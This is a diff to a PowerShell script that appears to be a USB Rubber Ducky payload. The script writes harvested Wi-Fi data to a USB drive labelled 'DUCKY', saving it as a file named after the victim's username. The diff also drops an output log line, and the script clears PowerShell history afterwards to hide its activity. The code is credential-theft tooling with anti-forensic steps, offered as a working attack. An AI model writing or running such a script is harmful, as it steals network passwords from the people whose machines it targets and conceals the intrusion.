@@ -5,8 +5,8 @@ $targetLabel = "DUCKY"
 $volume = Get-Volume | Where-Object { $_.FileSystemLabel -eq $targetLabel }
 
 if ($volume) {
-    $driveLetter = $volume.DriveLetter + ":"
-    $usbPath = "$driveLetter\wifi_passwords.txt"  # Define a fixed name for the output file
+    $driveLetter = $volume.DriveLetter + ":\"  # Define the USB drive path
+    $usbPath = "$driveLetter\$env:username.txt"  # Output file path
     Write-Output "Drive letter found: $driveLetter"
 } else {
     Write-Error "Drive with label '$targetLabel' not found."
@@ -39,9 +39,6 @@ $jsonBody = $wifiData | ConvertTo-Json -Depth 3
 
 # Save the JSON data to a file on the USB drive
 $jsonBody | Out-File -FilePath $usbPath -Encoding UTF8
-
-# Log the result
-Write-Output "Wi-Fi data saved to: $usbPath"
 
 # Clear the PowerShell command history
 Clear-History
